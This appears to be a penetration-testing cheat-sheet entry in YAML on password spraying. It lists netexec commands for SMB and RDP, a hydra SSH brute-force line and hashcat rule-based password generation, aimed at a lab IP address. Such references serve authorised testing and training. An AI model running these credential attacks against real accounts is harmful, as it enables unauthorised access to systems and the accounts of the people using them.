---
description: |
  Password spraying — test one or a few passwords against many accounts across multiple protocols. Includes rule-based password generation.
commands:
  - have: Password
    cmd: |
      nxc smb 10.10.10.27 -u users.txt -p 'P@ssw0rd' --continue-on-success
      nxc rdp 10.10.10.27 -u users.txt -p 'P@ssw0rd'
      hydra -L users.txt -P pass.txt ssh://10.10.10.27 -t 4
  - have: Username
    cmd: |
      # Generate passwords with rules, then spray
      hashcat raw.txt --stdout -r /usr/share/hashcat/rules/best64.rule > rawpass.txt
      nxc smb 10.10.10.27 -u sec_user -p rawpass.txt --continue-on-success
phase:
  - Exploitation
target_os:
  - Windows
services:
  - Active_Directory
  - SMB
  - LDAP
  - Kerberos
  - SSH
  - RDP
techniques:
  - Password_Spraying
references:
  - https://www.netexec.wiki/
  - https://github.com/dafthack/DomainPasswordSpray
  - https://github.com/vanhauser-thc/thc-hydra
---
